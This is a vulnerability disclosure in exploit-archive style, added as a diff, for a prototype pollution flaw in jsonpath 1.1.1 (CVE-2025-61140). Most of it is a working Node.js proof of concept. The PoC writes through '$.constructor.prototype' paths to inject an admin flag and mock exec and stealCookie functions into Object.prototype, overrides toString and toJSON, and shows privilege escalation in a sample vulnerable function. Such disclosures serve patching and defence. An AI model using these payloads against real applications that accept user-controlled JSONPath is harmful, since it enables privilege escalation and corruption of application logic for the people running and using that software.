@@ -1,0 +1,95 @@
+=============================================================================================================================================
+| # Title     : jsonpath 1.1.1 Prototype Pollution via constructor.prototype Assignment                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.redhat.com/                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215071/  & 	CVE-2025-61140
+
+[+] Summary    : a prototype pollution vulnerability in jsonpath v1.1.1, where unsafe writes to $.constructor.prototype allow attackers to inject arbitrary properties and functions into Object.prototype. 
+                 By abusing jsonpath.value, an attacker can globally modify object behavior—adding flags (e.g., admin), overriding core methods (toString, toJSON), and impacting arrays and strings through 
+				 the shared prototype chain. The PoC runs in Node.js and shows how a vulnerable application that accepts user‑controlled JSONPath expressions can be compromised, 
+				 leading to privilege escalation and logic manipulation across the entire runtime.
+                 Unvalidated writes to constructor.prototype enable global state corruption—making prototype pollution a high‑impact risk even without direct code execution.
+  
+[+] POC :   
+
+const jsonpath = require('jsonpath');
+
+console.log("=== Prototype Pollution PoC By indoushka(jsonpath 1.1.1) ===\n");
+console.log("1. Basic Test:");
+console.log("Before:", ({}).polluted); // undefined
+jsonpath.value({}, '$.constructor.prototype.polluted', "Yes, polluted");
+jsonpath.value({}, '$.constructor.prototype.isHacked', true);
+jsonpath.value({}, '$.constructor.prototype.hacker', "attacker");
+
+console.log("After polluted:", ({}).polluted);
+console.log("After isHacked:", ({}).isHacked);
+console.log("After hacker:", ({}).hacker);
+console.log("\n2. Function Injection:");
+
+jsonpath.value({}, '$.constructor.prototype.exec', function (cmd) {
+    return `[MOCK EXEC] ${cmd}`;
+});
+
+jsonpath.value({}, '$.constructor.prototype.stealCookie', function () {
+    return "Node.js environment – no cookies";
+});
+
+const o = {};
+console.log(o.exec("whoami"));
+console.log(o.stealCookie());
+console.log("\n3. Behavior Modification:");
+
+const originalToString = Object.prototype.toString;
+const originalToJSON   = Object.prototype.toJSON;
+
+jsonpath.value({}, '$.constructor.prototype.toString', function () {
+    return "[Object HACKED]";
+});
+
+jsonpath.value({}, '$.constructor.prototype.toJSON', function () {
+    return { hacked: true };
+});
+
+const test = { a: 1 };
+console.log("toString:", test.toString());
+console.log("JSON:", JSON.stringify(test));
+console.log("\n4. Other Types:");
+const arr = [1, 2, 3];
+console.log("Array polluted:", arr.polluted);
+const str = "hello";
+console.log("String polluted:", str.polluted);
+console.log("\n5. Practical Scenario:");
+
+function vulnerableApplication(path, value) {
+    jsonpath.value({}, path, value);
+}
+
+console.log("Before admin:", ({}).admin);
+
+vulnerableApplication(
+    '$.constructor.prototype.admin',
+    true
+);
+
+console.log("After admin:", ({}).admin);
+console.log("\n6. Cleanup:");
+
+delete Object.prototype.polluted;
+delete Object.prototype.isHacked;
+delete Object.prototype.hacker;
+delete Object.prototype.exec;
+delete Object.prototype.stealCookie;
+delete Object.prototype.admin;
+
+Object.prototype.toString = originalToString;
+Object.prototype.toJSON   = originalToJSON;
+
+console.log("After cleanup polluted:", ({}).polluted);
+console.log("After cleanup admin:", ({}).admin);
+
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
